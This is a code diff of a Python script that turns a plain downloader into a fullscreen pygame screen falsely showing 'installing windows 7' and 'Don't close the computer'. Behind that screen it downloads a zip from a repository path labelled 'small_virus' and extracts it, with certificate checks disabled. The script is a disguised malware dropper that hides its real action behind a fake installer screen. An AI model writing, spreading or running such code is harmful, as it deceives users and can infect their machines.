@@ -1,41 +1,122 @@
-import requests
-from tqdm import tqdm
-import zipfile
 import os
+os.system('cls')
+print('checking dependencies...')
+os.system('python -m pip install requests tqdm pygame')
+import pygame
+import requests
+import zipfile
+import sys
+import threading
 
-def download_file(url, output_path):
+def download_file(url, output_path, progress_callback):
     response = requests.get(url, stream=True, verify=False)
     total_size = int(response.headers.get('content-length', 0))
     block_size = 1024  # 1 Kibibyte
 
-    with open(output_path, 'wb') as file, tqdm(
-        desc=output_path,
-        total=total_size,
-        unit='iB',
-        unit_scale=True,
-        unit_divisor=1024,
-    ) as bar:
+    with open(output_path, 'wb') as file:
+        downloaded_size = 0
         for data in response.iter_content(block_size):
-            bar.update(len(data))
             file.write(data)
+            downloaded_size += len(data)
+            progress_callback(downloaded_size, total_size)
 
 def extract_zip(file_path, extract_to='.'):
     with zipfile.ZipFile(file_path, 'r') as zip_ref:
         zip_ref.extractall(extract_to)
 
 def main():
+    pygame.init()
+
+    # 设置全屏模式
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    screen_width, screen_height = screen.get_size()
+
+    # 设置背景颜色
+    background_color = (30, 30, 30)  # 深灰色
+    screen.fill(background_color)
+
+    # 设置字体
+    font = pygame.font.SysFont('Arial', 36)
+    small_font = pygame.font.SysFont('Arial', 24)
+
+    # 计算进度条的位置和大小
+    progress_bar_width = screen_width * 0.6
+    progress_bar_height = 50
+    progress_bar_x = (screen_width - progress_bar_width) / 2
+    progress_bar_y = screen_height * 0.8
+
+    # 下载文件
     url = 'https://github.com/huluobuo/filesss-huluobuo/raw/refs/heads/main/small_virus/Windows_7_Song_of_Death/error.zip'
     output_path = 'error.zip'
 
-    print("Downloading file...")
-    download_file(url, output_path)
+    progress = 0
 
-    print("Extracting file...")
-    extract_zip(output_path)
+    def update_progress(downloaded, total_size):
+        nonlocal progress
+        if total_size > 0:
+            progress = downloaded / total_size * 100
 
-    # Optionally, remove the zip file after extraction
-    os.remove(output_path)
-    print("Done.")
+    def download_thread():
+        nonlocal download_complete
+        try:
+            download_file(url, output_path, update_progress)
+            download_complete = True
+        except Exception as e:
+            print(f"Error during download: {e}")
+            download_complete = False
+
+    # 启动下载线程
+    download_complete = False
+    threading.Thread(target=download_thread).start()
+
+    # 主循环
+    running = True
+    while running:
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                running = False
+            elif event.type == pygame.KEYDOWN:
+                if event.key == pygame.K_ESCAPE:
+                    running = False
+
+        # 绘制背景
+        screen.fill(background_color)
+
+        # 绘制进度条背景
+        pygame.draw.rect(screen, (50, 50, 50), (progress_bar_x, progress_bar_y, progress_bar_width, progress_bar_height))
+
+        # 绘制进度条前景
+        pygame.draw.rect(screen, (0, 120, 215), (progress_bar_x, progress_bar_y, progress_bar_width * (progress / 100), progress_bar_height))
+
+        # 绘制进度文本
+        progress_text = font.render(f'installing windows 7 - {int(progress)}%', True, (255, 255, 255))
+        text_rect = progress_text.get_rect(center=(screen_width / 2, progress_bar_y + progress_bar_height / 2 + 75))
+        screen.blit(progress_text, text_rect)
+
+        # 绘制更新文本
+        update_text = small_font.render("windows installer   V1.2 pro - prodeced by huluobuo", True, (255, 255, 255))
+        update_text_rect = update_text.get_rect(center=(screen_width / 2, screen_height * 0.7))
+        screen.blit(update_text, update_text_rect)
+
+        # 绘制提示文本
+        tip_text = small_font.render("(C) 2025 huluobuo - Don't close the computer", True, (255, 255, 255))
+        tip_text_rect = tip_text.get_rect(center=(screen_width / 2, screen_height * 0.75))
+        screen.blit(tip_text, tip_text_rect)
+
+        # 更新显示
+        pygame.display.flip()
+
+        # 控制帧率
+        pygame.time.Clock().tick(60)
+
+    if download_complete:
+        print("Extracting file...")
+        extract_zip(output_path)
+        os.remove(output_path)
+        print("Done.")
+
+    pygame.quit()
+    sys.exit()
 
 if __name__ == "__main__":
     main()
